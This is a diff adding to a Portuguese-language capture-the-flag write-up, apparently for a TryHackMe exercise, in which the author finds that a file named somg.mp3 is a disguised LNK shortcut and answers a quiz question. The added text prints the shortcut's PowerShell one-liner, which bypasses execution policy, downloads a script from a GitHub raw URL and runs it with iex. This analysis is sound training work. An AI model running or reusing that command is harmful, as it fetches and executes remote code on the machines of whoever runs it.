@@ -38,7 +38,14 @@ Mas temos um arquivo disfarçado sendo o segundo arquivo chamado de somg.mp3, a 
 Utilizei o comando file somg.mp3 identifiquei como um atalho LNK ao inves de um arquivo de audio, que apontava para o powershell.exe. iremos nos apronfundar muito mais.
 ![image](https://github.com/user-attachments/assets/4b9fb32d-e983-4834-9a9b-7282d912d88b)
 
+Usei exiftool somg.mp3, para obter informações mais detalhadas sobre o atalho, e o arquivo apontava para um comando PowerShell, que baixava e executava um script localizado no GitHub, sendo o comando:
+powershell.exe -ep bypass -nop -c (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1')
+
+![image](https://github.com/user-attachments/assets/fdf7380b-cde3-42af-8c72-8a3699b23b60)
 
 
+
+RESPONDENDO A 1ª PERGUNTA
 ![image](https://github.com/user-attachments/assets/45ce33f5-bab7-4c73-b64f-6bede4101ee0)
+Eu também usei o exiftool no arquivo song.mp3, confirmando que ele era realmente um arquivo MP3 e obtendo a informação da 1ª pergunta da TAREFA 7, sendo o Artista: Tyler Ramsbey
 
